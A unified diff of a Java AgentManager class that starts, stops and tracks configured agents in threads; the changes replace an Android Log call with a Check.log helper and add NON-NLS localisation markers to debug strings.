@@ -10,8 +10,6 @@ package com.android.service.agent;
 import java.util.HashMap;
 import java.util.Iterator;
 
-import android.util.Log;
-
 import com.android.service.Manager;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.IncrementalLog;
@@ -23,7 +21,7 @@ import com.android.service.util.Check;
 public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 
 	/** The Constant TAG. */
-	private static final String TAG = "AgentManager";
+	private static final String TAG = "AgentManager"; //$NON-NLS-1$
 
 	/** The singleton. */
 	private volatile static AgentManager singleton;
@@ -58,14 +56,14 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 
 		if (agents == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Agents map null");
+				Check.log(TAG + " Agents map null") ;//$NON-NLS-1$
 			}
 			return false;
 		}
 
 		if (running == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Running Agents map null");
+				Check.log(TAG + " Running Agents map null") ;//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -75,7 +73,7 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 		while (it.hasNext()) {
 			final Integer key = it.next();
 			if (Cfg.DEBUG) {
-				Check.asserts(key != null, "null type");
+				Check.asserts(key != null, "null type"); //$NON-NLS-1$
 			}
 			final AgentConf conf = agents.get(key);
 
@@ -98,7 +96,7 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 		final Iterator<Integer> it = agents.keySet().iterator();
 
 		if (Cfg.DEBUG) {
-			Log.d("QZ", TAG + " (stopAll)");
+			Check.log( TAG + " (stopAll)") ;//$NON-NLS-1$
 		}
 
 		while (it.hasNext()) {
@@ -107,10 +105,10 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 		}
 
 		if (Cfg.DEBUG) {
-			Check.ensures(threads.size() == 0, "Non empty threads");
+			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.ensures(running.size() == 0, "Non empty running");
+			Check.ensures(running.size() == 0, "Non empty running"); //$NON-NLS-1$
 		}
 
 		running.clear();
@@ -131,14 +129,14 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 
 		if (agents == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Agents map null");
+				Check.log(TAG + " Agents map null") ;//$NON-NLS-1$
 			}
 			return;
 		}
 
 		if (running == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Running Agents map null");
+				Check.log(TAG + " Running Agents map null") ;//$NON-NLS-1$
 			}
 			return;
 		}
@@ -152,7 +150,7 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 		// Agent mapped and running
 		if (a.isRunning() || a.isSuspended()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Agent " + key + " is already running or suspended");
+				Check.log(TAG + " Agent " + key + " is already running or suspended") ;//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return;
 		}
@@ -160,10 +158,10 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 		a = makeAgent(key);
 
 		if (Cfg.DEBUG) {
-			Check.asserts(a != null, "null agent");
+			Check.asserts(a != null, "null agent"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.asserts(running.get(key) != null, "null running");
+			Check.asserts(running.get(key) != null, "null running"); //$NON-NLS-1$
 		}
 
 		a.parse(agents.get(key));
@@ -202,7 +200,7 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 
 		if (a == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Agent " + key + " not present");
+				Check.log(TAG + " Agent " + key + " not present") ;//$NON-NLS-1$ //$NON-NLS-2$
 			}
 			return;
 		}
@@ -216,7 +214,7 @@ public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 				t.join();
 			} catch (final InterruptedException e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 			}
 			threads.remove(a);
